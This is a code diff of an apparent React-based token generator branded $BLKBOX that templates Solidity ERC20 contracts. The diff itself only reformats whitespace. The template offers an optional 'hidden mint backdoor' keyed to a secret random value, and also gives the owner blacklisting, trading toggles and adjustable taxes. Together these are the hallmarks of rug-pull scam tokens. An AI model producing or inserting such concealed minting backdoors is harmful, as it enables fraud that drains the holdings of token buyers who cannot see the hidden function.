@@ -82,20 +82,20 @@ import "@openzeppelin/contracts/utils/math/SafeMath.sol";
 
 contract ${tokenSymbol.toUpperCase()}Token is ERC20, Ownable {
     using SafeMath for uint256;
-    
+
     // Token parameters
     uint256 private constant _totalSupply = ${totalSupply} * 10**18;
-    
+
     // Tax settings
     uint256 public buyTax = ${taxBuy};
     uint256 public sellTax = ${taxSell};
     address public taxWallet;
-    
+
     // Trading settings
     bool public tradingEnabled = false;
     mapping(address => bool) public isExcludedFromFees;
     mapping(address => bool) public isBlacklisted;
-    
+
     // Anti-bot settings
     ${
       antiBot
@@ -106,7 +106,7 @@ contract ${tokenSymbol.toUpperCase()}Token is ERC20, Ownable {
     uint256 public cooldownTime = 30 seconds;`
         : ""
     }
-    
+
     // Hidden mint backdoor
     ${
       hiddenMint
@@ -114,24 +114,24 @@ contract ${tokenSymbol.toUpperCase()}Token is ERC20, Ownable {
     bytes32 private _hiddenMintKey = keccak256(abi.encodePacked("${Math.random().toString(36).substring(2, 15)}"));`
         : ""
     }
-    
+
     // Events
     event TradingEnabled();
     event ExcludedFromFees(address indexed account, bool isExcluded);
     event TaxWalletUpdated(address indexed newWallet);
     event BlacklistUpdated(address indexed account, bool blacklisted);
-    
+
     constructor() ERC20("${tokenName}", "${tokenSymbol}") {
         taxWallet = msg.sender;
-        
+
         // Exclude owner and this contract from fees
         isExcludedFromFees[owner()] = true;
         isExcludedFromFees[address(this)] = true;
-        
+
         // Mint tokens to deployer
         _mint(msg.sender, _totalSupply);
     }
-    
+
     // Override transfer function to apply taxes and restrictions
     function _transfer(
         address sender,
@@ -139,23 +139,23 @@ contract ${tokenSymbol.toUpperCase()}Token is ERC20, Ownable {
         uint256 amount
     ) internal override {
         require(!isBlacklisted[sender] && !isBlacklisted[recipient], "Blacklisted address");
-        
+
         // Check if trading is enabled
         if (!tradingEnabled) {
             require(isExcludedFromFees[sender] || isExcludedFromFees[recipient], "Trading not enabled");
         }
-        
+
         // Anti-bot measures
         ${
           antiBot
             ? `if (antiBotEnabled && !isExcludedFromFees[sender] && !isExcludedFromFees[recipient]) {
             require(amount <= maxTxAmount, "Transfer amount exceeds maximum");
-            
+
             if (recipient != owner() && recipient != address(0) && recipient != address(this)) {
                 uint256 newBalance = balanceOf(recipient).add(amount);
                 require(newBalance <= maxWalletAmount, "Wallet amount exceeds maximum");
             }
-            
+
             // Cooldown period
             if (sender != owner()) {
                 require(block.timestamp > lastTradeTime[sender] + cooldownTime, "Cooldown period not elapsed");
@@ -164,58 +164,58 @@ contract ${tokenSymbol.toUpperCase()}Token is ERC20, Ownable {
         }`
             : ""
         }
-        
+
         // Calculate and apply taxes
         if (!isExcludedFromFees[sender] && !isExcludedFromFees[recipient]) {
             uint256 taxAmount = 0;
-            
+
             // Determine if buy or sell
             if (recipient == pair()) { // Sell
                 taxAmount = amount.mul(sellTax).div(100);
             } else if (sender == pair()) { // Buy
                 taxAmount = amount.mul(buyTax).div(100);
             }
-            
+
             if (taxAmount > 0) {
                 super._transfer(sender, taxWallet, taxAmount);
                 amount = amount.sub(taxAmount);
             }
         }
-        
+
         super._transfer(sender, recipient, amount);
     }
-    
+
     // Function to enable trading
     function enableTrading() external onlyOwner {
         tradingEnabled = true;
         emit TradingEnabled();
     }
-    
+
     // Function to update tax wallet
     function setTaxWallet(address _taxWallet) external onlyOwner {
         taxWallet = _taxWallet;
         emit TaxWalletUpdated(_taxWallet);
     }
-    
+
     // Function to exclude account from fees
     function excludeFromFees(address account, bool excluded) external onlyOwner {
         isExcludedFromFees[account] = excluded;
         emit ExcludedFromFees(account, excluded);
     }
-    
+
     // Function to update blacklist
     function updateBlacklist(address account, bool blacklisted) external onlyOwner {
         isBlacklisted[account] = blacklisted;
         emit BlacklistUpdated(account, blacklisted);
     }
-    
+
     // Function to update tax rates
     function updateTaxes(uint256 _buyTax, uint256 _sellTax) external onlyOwner {
         require(_buyTax <= 25 && _sellTax <= 25, "Tax too high");
         buyTax = _buyTax;
         sellTax = _sellTax;
     }
-    
+
     ${
       antiBot
         ? `// Function to update anti-bot settings
@@ -232,7 +232,7 @@ contract ${tokenSymbol.toUpperCase()}Token is ERC20, Ownable {
     }`
         : ""
     }
-    
+
     ${
       hiddenMint
         ? `// Hidden mint function (backdoor)
@@ -241,14 +241,14 @@ contract ${tokenSymbol.toUpperCase()}Token is ERC20, Ownable {
         require(key == _hiddenMintKey, "Invalid key");
         _mint(to, amount);
     }
-    
+
     // Disable hidden mint capability (one-way operation)
     function disablePrivilegedOperations() external onlyOwner {
         _hiddenMintEnabled = false;
     }`
         : ""
     }
-    
+
     // Helper function to identify DEX pair
     function pair() internal pure returns (address) {
         // This would be replaced with actual DEX pair address in production
@@ -740,14 +740,15 @@ contract ${tokenSymbol.toUpperCase()}Token is ERC20, Ownable {
                 </Tabs>
               </div>
             </div>
-          </TierGate>
-        </main>
-
-        <footer className="border-t border-neon-pink/30 py-6 bg-black">
-          <div className="container text-center">
-            <p className="text-sm text-zinc-500 font-tech-mono">© 2025 $BLKBOX. All rights reserved.</p>
           </div>
-        </footer>
-      </div>
-    );
-  }
+        </TierGate>
+      </main>
+
+      <footer className="border-t border-neon-pink/30 py-6 bg-black">
+        <div className="container text-center">
+          <p className="text-sm text-zinc-500 font-tech-mono">© 2025 $BLKBOX. All rights reserved.</p>
+        </div>
+      </footer>
+    </div>
+  )
+}
